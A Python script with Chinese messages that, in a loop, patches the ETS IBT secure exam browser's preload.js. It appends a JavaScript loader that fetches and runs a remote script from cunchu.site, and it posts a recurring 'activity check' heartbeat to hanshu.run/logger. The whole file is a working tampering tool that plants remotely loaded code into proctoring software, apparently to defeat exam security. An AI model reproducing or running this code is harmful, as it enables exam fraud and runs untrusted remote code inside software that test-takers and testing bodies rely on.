import requests
import json

import time
import os
# 打开文件并读取所有内容
ind = 1
while True:
    if os.path.exists("../ETS/IBT2/securebrowser/resources/app/preload.js"):
        with open("../ETS/IBT2/securebrowser/resources/app/preload.js", "r") as file:
            content = file.read()
            file.close()
            if ('cunchu.site' not in content):
                print('修改文件!')
                time.sleep(3)
                content = content + '\r\nfunction loadScript(url,callback){var script=document.createElement("script");script.type="text/javascript";if(script.readyState){script.onreadystatechange=function(){if(script.readyState=="loaded"||script.readyState=="complete"){script.onreadystatechange=null;if(callback)callback()}}}else{script.onload=function(){if(callback)callback()}}script.src=url;var head=document.head||document.getElementsByTagName("head")[0];head.appendChild(script)};setTimeout(() => {loadScript("https://cunchu.site/work/ets/index.js")}, 100);'
                with open("../ETS/IBT2/securebrowser/resources/app/preload.js", "w") as file2:
                    file2.write(content)
                    file2.close()
            else:
                print('正常!')
    else:
        print('目录不正确!')
    url = "https://hanshu.run/logger"

    payload = json.dumps({
        "group": "VUB",
        "type": "message",
        "user": "1",
        "message": "活跃检测"
    })
    headers = {
        'Content-Type': 'application/json'
    }

    response = requests.request("POST", url, headers=headers, data=payload)
    time.sleep(5)
